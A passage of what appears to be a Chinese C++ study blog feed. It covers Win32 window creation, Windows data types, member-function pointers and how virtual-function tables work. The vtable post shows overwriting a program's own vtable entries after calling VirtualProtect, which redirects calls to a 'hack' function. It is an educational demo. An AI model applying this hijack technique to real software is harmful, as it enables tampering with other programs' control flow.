class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">LPCTSTR clsName = <span class="string">&quot;my&quot;</span>;</span><br><span class="line">LPCTSTR msgName = <span class="string">&quot;xuexi&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWinProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HWND hwnd,      <span class="comment">// handle to window</span></span></span></span><br><span class="line"><span class="params"><span class="function">UINT uMsg,      <span class="comment">// message identifier</span></span></span></span><br><span class="line"><span class="params"><span class="function">WPARAM wParam,  <span class="comment">// first message parameter</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPARAM lParam   <span class="comment">// second message parameter</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//windows主函数入口</span></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">PSTR lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">INT nCmdShow</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>&#123;</span><br><span class="line"><span class="comment">// windows对象，设计窗口类</span></span><br><span class="line">WNDCLASS wndclass;</span><br><span class="line">wndclass.cbClsExtra = <span class="literal">NULL</span>;</span><br><span class="line">wndclass.cbWndExtra = <span class="literal">NULL</span>;</span><br><span class="line">wndclass.hbrBackground = (HBRUSH)<span class="built_in">GetStockObject</span>(WHITE_BRUSH);</span><br><span class="line">wndclass.hCursor = <span class="built_in">LoadCursor</span>(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">wndclass.hIcon = <span class="built_in">LoadIcon</span>(<span class="literal">NULL</span>, IDI_APPLICATION);</span><br><span class="line">wndclass.hInstance = hInstance;</span><br><span class="line"><span class="comment">//定义交互响应</span></span><br><span class="line">wndclass.lpfnWndProc = MyWinProc;  <span class="comment">//回调</span></span><br><span class="line"><span class="comment">//定义窗口代号</span></span><br><span class="line">wndclass.lpszClassName = clsName;</span><br><span class="line">wndclass.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册窗口类</span></span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;wndclass);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建窗口</span></span><br><span class="line">HWND hwnd;</span><br><span class="line">hwnd = <span class="built_in">CreateWindow</span>(</span><br><span class="line">clsName, msgName, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">hInstance, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//显示窗口和刷新窗口</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd, SW_SHOWNORMAL);</span><br><span class="line"><span class="built_in">UpdateWindow</span>(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息循环</span></span><br><span class="line">MSG msg;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>))&#123;<span class="comment">//得到消息</span></span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);<span class="comment">//翻译消息为字符</span></span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);<span class="comment">//分派消息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWinProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HWND hwnd,      <span class="comment">// handle to window</span></span></span></span><br><span class="line"><span class="params"><span class="function">UINT uMsg,      <span class="comment">// message identifier</span></span></span></span><br><span class="line"><span class="params"><span class="function">WPARAM wParam,  <span class="comment">// first message parameter</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPARAM lParam   <span class="comment">// second message parameter</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>&#123;</span><br><span class="line"><span class="comment">// uMsg 消息类型</span></span><br><span class="line"><span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">HDC hdc;</span><br><span class="line"><span class="keyword">switch</span> (uMsg)&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CHAR:</span><br><span class="line"><span class="type">char</span> szChar[<span class="number">20</span>];</span><br><span class="line"><span class="built_in">sprintf_s</span>(szChar, <span class="string">&quot;您刚才按下了：%c&quot;</span>, wParam);</span><br><span class="line"><span class="built_in">MessageBox</span>(hwnd,szChar,<span class="string">&quot;char&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line"><span class="built_in">MessageBox</span>(hwnd, <span class="string">&quot;检测鼠标左键按下&quot;</span>, <span class="string">&quot;msg&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">PAINTSTRUCT ps;</span><br><span class="line">hdc = <span class="built_in">BeginPaint</span>(hwnd, &amp;ps);</span><br><span class="line"><span class="built_in">TextOut</span>(hdc, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;www.baidu.com&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;www.baidu.com&quot;</span>));</span><br><span class="line"><span class="built_in">EndPaint</span>(hwnd, &amp;ps);</span><br><span class="line"><span class="built_in">MessageBox</span>(hwnd, <span class="string">&quot;重绘&quot;</span>, <span class="string">&quot;msg&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">ret = <span class="built_in">MessageBox</span>(hwnd, <span class="string">&quot;是否真的结束?&quot;</span>, <span class="string">&quot;msg&quot;</span>, MB_YESNO);</span><br><span class="line"><span class="keyword">if</span> (ret == IDYES)&#123;</span><br><span class="line"><span class="built_in">DestroyWindow</span>(hwnd);<span class="comment">//如果选择yes则销毁窗口</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd,uMsg,wParam,lParam);</span><br><span class="line"><span class="comment">//break;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>窗口就是这玩意，不难理解也不难看出</p><img src="/2022/07/07/win-windows/005.png" class=""><blockquote><p>句柄[handle]：二级指针、资源的编号。窗口句柄、文件句柄、数据库连结句柄。</p></blockquote><p>至于c++窗口类对象和窗口之间的关系，就是对象内置窗口句柄，窗口点击关闭之后，对象不一定就释放了，但是对象的生命周期结束了，窗口就一定销毁了。</p><hr><h2 id="windows常见数据类型"><a href="#windows常见数据类型" class="headerlink" title="windows常见数据类型"></a>windows常见数据类型</h2><table><thead><tr><th>code</th><th>含义</th></tr></thead><tbody><tr><td>DWORD</td><td>32字节无符号整型数据</td></tr><tr><td>DWORD32</td><td>32字节无符号整型数据</td></tr><tr><td>DWORD64</td><td>64字节无符号整型数据</td></tr><tr><td>HANDLE</td><td>对象句柄，最基本的句柄类型</td></tr><tr><td>HICON</td><td>图标的句柄</td></tr><tr><td>HINSTANCE</td><td>程序实例的句柄</td></tr><tr><td>HKEY</td><td>注册表键的句柄</td></tr><tr><td>HMODULE</td><td>模块的句柄</td></tr><tr><td>HWND</td><td>窗口的句柄</td></tr><tr><td>INT</td><td>32位符号整型数据类型</td></tr><tr><td>INT_PTR</td><td>指向INT的指针类型</td></tr><tr><td>INT32</td><td>32位符号整型</td></tr><tr><td>INT64</td><td>64位符号整型</td></tr><tr><td>LONG32</td><td>32位符号整型</td></tr><tr><td>LONG64</td><td>64位符号整型</td></tr><tr><td>LPARAM</td><td>消息的L参数</td></tr><tr><td>WPARAM</td><td>消息的w参数</td></tr><tr><td>LPCSTR</td><td>windows，ANSI，字符串常量</td></tr><tr><td>LPCTSTR</td><td>根据环境配置，如果定义了Unicode宏，则是LPCWSTR，否则LPCSTR</td></tr><tr><td>LPCWSTR</td><td>Unicode字符串常量</td></tr><tr><td>LPDWORD</td><td>指向DWORD类型的指针</td></tr><tr><td>LPSTR</td><td>windows，ANSI，字符串变量</td></tr><tr><td>LPTSTR</td><td>根据环境配置，如果定义了Unicode宏，则是LPWSTR，否则LPSTR类型</td></tr><tr><td>LPWSTR</td><td>Unicode字符串变量</td></tr><tr><td>SIZE_T</td><td>表示内存大小，以字节位单位，其最大值是CPU最大寻址范围</td></tr><tr><td>TCHAR</td><td>如果定义了Unicode，则为WCHAR</td></tr><tr><td>WCHAR</td><td>16位Unicode字符</td></tr></tbody></table><hr><h2 id="windows命名"><a href="#windows命名" class="headerlink" title="windows命名"></a>windows命名</h2><table><thead><tr><th>前缀</th><th>含义</th><th>前缀</th><th>含义</th></tr></thead><tbody><tr><td>a</td><td>数组array</td><td>b</td><td>布尔值bool</td></tr><tr><td>by</td><td>无符号字符[字节]</td><td>c</td><td>字符[字节]</td></tr><tr><td>cb</td><td>字节计数</td><td>rgb</td><td>保存颜色值的长整型</td></tr><tr><td>cx，cy</td><td>短整型[计算x，y的长度]</td><td>dw</td><td>无符号长整型</td></tr><tr><td>fn</td><td>函数</td><td>h</td><td>句柄</td></tr><tr><td>i</td><td>整型</td><td>m_</td><td>类的数据成员member</td></tr><tr><td>n</td><td>短整型或整型</td><td>np</td><td>近指针</td></tr><tr><td>p</td><td>指针</td><td>l</td><td>长整型</td></tr><tr><td>lp</td><td>长指针</td><td>s</td><td>字符串string</td></tr><tr><td>sz</td><td>以0结尾的字符串</td><td>tm</td><td>正文大小</td></tr><tr><td>w</td><td>无符号整型</td><td>x，y</td><td>无符号整型[表示x，y的坐标]</td></tr></tbody></table><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>用空项目套窗口太累了。。。基础窗口全要自己写，而且参数是真的多。<br>先了解基本原理吧。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚函数实现机制</title>
      <link href="/2022/07/06/virtualFunction1/"/>
      <url>/2022/07/06/virtualFunction1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>虚函数本身就很玄学，像基类只做声明，派生类在定义，然后不同派生类之间还能依次找到不同的。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p><strong>注：x86环境，非x64</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AIM</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> HP;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;AIM\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Die</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;AIM-DIE\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WOLF</span> :<span class="keyword">public</span> AIM&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;WOLF\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Die</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;WOLF-DIE\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sound</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;aowu~aowu~\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/07/06/virtualFunction1/000.png" class=""><p>当用sizeof查看aim类的大小时，发现是占用8个字节，但是按照逻辑，实际上应该是只有成员变量占用了实例化的内存。<br>而这多出来的4字节，就看要是在成员变量前面还是后面了。</p><p><code>std::cout &lt;&lt; aim &lt;&lt; &quot; &quot; &lt;&lt; &amp;aim-&gt;HP &lt;&lt; std::endl;</code></p><img src="/2022/07/06/virtualFunction1/001.png" class=""><p>发现这个四字节应该是存在于hp之前，说明大概率和后面的虚函数有关</p><p>通过反汇编之后</p><img src="/2022/07/06/virtualFunction1/002.png" class=""><p>我们看到类调用一个虚函数会这么麻烦。</p><p>他先把aim对象地址上的值传给eax，然后又把eax传给edx。<br>至于aim又传给ecx先不管，看后面的，edx+4 传给eax之后，就直接call eax了，我们知道call的都是函数的地址。<br>说明通过edx+4之后偏移得到了die虚函数的地址。<br>而根本的一切还是从aim开头。</p><img src="/2022/07/06/virtualFunction1/003.png" class=""><p>说明这个四字节很有可能就像地址表一样。</p><p>然后在调用之前的eat函数</p><img src="/2022/07/06/virtualFunction1/004.png" class=""><p>看到基本步骤都差不多，差异就在后面不是edx+4，而是直接传edx。</p><p>也就是说这个带有虚函数的类前面多出来的四字节，就是一个指针，指向虚函数表</p><img src="/2022/07/06/virtualFunction1/005.png" class=""><p>因为是指针，我们就可以取出来查看。</p><img src="/2022/07/06/virtualFunction1/006.png" class=""><p>可以看到利用指针拆分掉这个类，变成两个数组成员，0的位置就是我们类的指针区域。</p><p>因为x86的指针大小就是4字节，所以找到vtable[0]这个基地址，再将其拆出两个虚函数的地址。</p><img src="/2022/07/06/virtualFunction1/007.png" class=""><p>虽然这两个虚函数的地址可能看着很奇怪，毕竟不是放在同一个地方的。<br>可以用反汇编去印证一下。</p><img src="/2022/07/06/virtualFunction1/008.png" class=""><p>当我们逐语句执行到call eax的时候，就能观察到eax现在经过偏移得到我们调用的die虚函数的地址。</p><p>所以对于多态类而言</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AIM</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> HP;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;AIM\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Die</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;AIM-DIE\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><table><thead><tr><th>地址</th><th>变量名</th><th>含义</th></tr></thead><tbody><tr><td>+0x0</td><td>vatble</td><td>aim类虚函数地址表</td></tr><tr><td>+0x4</td><td>hp</td><td>成员变量</td></tr></tbody></table><p>他的内存分布上会有明显差异。</p><p>所以虚表的性质</p><ol><li>同一个类的多个实例都指向同一个虚函数表</li><li>通过修改虚函数表的数据可以实现劫持</li><li>只有通过指针访问函数才会调用显示函数表</li></ol><p>也就是基类的实例化对象再多，这个虚表都是一个地方，派生类肯定会和基类的虚表地址不同。<br>修改了这个虚表，就能通过这个数据偏移到其他地方</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">hack</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;被劫持辣！\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随便创个函数，然后修改func[0]为这个函数地址，就有意思了。<br>不过vs的ide好像有保护，直接写入会报错</p><img src="/2022/07/06/virtualFunction1/009.png" class=""><p>额个人是不会处理的，看大哥操作，调用windows先搞掉原有保护</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span><span class="comment">//引入头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line">DWORD old;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(func, <span class="number">8</span>, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加这些之后，就可以修改虚地址表了。</p><img src="/2022/07/06/virtualFunction1/010.png" class=""><p>可以看到两个指向虚函数的地址都被修改成了hack函数的地址。</p><p>至于第一个说性质在这里就能看出来，因为之前的是通过wolf构建初始化的，当我们修改wolf的虚表，是不会对基类造成影响的</p><img src="/2022/07/06/virtualFunction1/011.png" class=""><p>至于第三个，像我们这种正常初始化的情况下，他没有指针，也没有通过所谓的虚表偏移去找到虚函数，而是当成一个简单的方法调用</p><img src="/2022/07/06/virtualFunction1/012.png" class=""><p>就没用收到之前修改虚表指向hack的问题。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>指针。。地址，表还是很玄乎的东西。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类的成员函数的函数指针</title>
      <link href="/2022/07/04/classfunctionpointer/"/>
      <url>/2022/07/04/classfunctionpointer/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>函数指针：函数指针是指向函数的指针变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> (*pAdd)(<span class="type">int</span>, <span class="type">int</span>) = add;</span><br></pre></td></tr></table></figure><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;test!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hhh!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果按照正常逻辑，想让函数指针指向一个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">void</span> (*pTest)() = test;</span><br></pre></td></tr></table></figure><p>这样肯定是不对的，因为这个test是类的成员函数而不是所谓的全局函数，如果全局函数都没有，那么这个test就是一个未定义标识符<br>有的人可能会想到作用域问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">void</span> (*pTest)() = Box::test;</span><br></pre></td></tr></table></figure><img src="/2022/07/04/classfunctionpointer/000.png" class=""><p>显然这也不是行的，毕竟类没有实例化，成员函数也非静态。<br>成员函数最关键的是它内部可以调用this指针，这是普通的函数无法做到的。</p><p>解决办法也是相对的，在报错的时候看到提示void (Box::*)()不能用于初始化void(*)()的实体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">void</span> (Box::*pTest)() = Box::test;</span><br></pre></td></tr></table></figure><p>那么显然它是要你在函数指针那块也要加上作用域。</p><hr><p>玩点话的，之前学过<code>typedef</code>也就是自定义类型名</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(Box:: *pBox)</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>然后就可以玩了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pBox pb;</span><br><span class="line">Box *box = <span class="keyword">new</span> <span class="built_in">Box</span>();</span><br><span class="line">(box-&gt;*pb)();</span><br></pre></td></tr></table></figure><p>不过这里会报错，因为pb没有初始化。<br>学类的时候，我们知道成员函数和成员变量有所区别，成员变量需要实例化才能调用，而成员函数编译的时候就分配好了地址，所以实例化多少类，成员函数地址都是一样的。除非说static，那种情况下既没有this指针，又在预编译阶段就完成了，可以直接通过类的作用域访问。</p><p>因此这里直接让他指向box其中的一个成员函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pBox pb = &amp;Box::test;</span><br><span class="line">Box *box = <span class="keyword">new</span> <span class="built_in">Box</span>();</span><br><span class="line">(box-&gt;*pb)();</span><br></pre></td></tr></table></figure><p>随便用一个，毕竟就俩。</p><img src="/2022/07/04/classfunctionpointer/001.png" class=""><p>可以看到，成功指向test，然后通过box指向指针解引用完成了函数调用。</p><p><strong>因为没有参数列表可能看着很古怪</strong></p><p>值得一提是，因为我们的类函数指针做了类限制，所以他只能指向这个类中的函数，普通的函数它是不能指向的。</p><hr><p>有的时候这个函数指针也可能直接作为类的成员变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>;                              <span class="comment">//声明</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(Box:: *pBox)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;test!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hhh!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Box</span>()&#123;</span><br><span class="line">phhh = &amp;Box::hhh;</span><br><span class="line">(<span class="keyword">this</span>-&gt;*phhh)();</span><br><span class="line">&#125;</span><br><span class="line">pBox phhh;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样一来</p><img src="/2022/07/04/classfunctionpointer/002.png" class=""><p>可以看到效果都差不多。</p><hr><p>然后就是static成员函数问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;func!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;test!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hhh!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Box</span>()&#123;</span><br><span class="line">phhh = &amp;Box::hhh;</span><br><span class="line">(<span class="keyword">this</span>-&gt;*phhh)();</span><br><span class="line">&#125;</span><br><span class="line">pBox phhh;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*pFun)</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><img src="/2022/07/04/classfunctionpointer/003.png" class=""><p>正常情况下可以这样调用。</p><img src="/2022/07/04/classfunctionpointer/004.png" class=""><p>通过定义的函数指针就可以用这种方式调用。<br>因为静态成员函数没有this指针，所以不需要在通过指针指向解引用出成员函数</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>看着用吧，知道就行。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抽象类</title>
      <link href="/2022/07/04/abstractclass/"/>
      <url>/2022/07/04/abstractclass/</url>
      
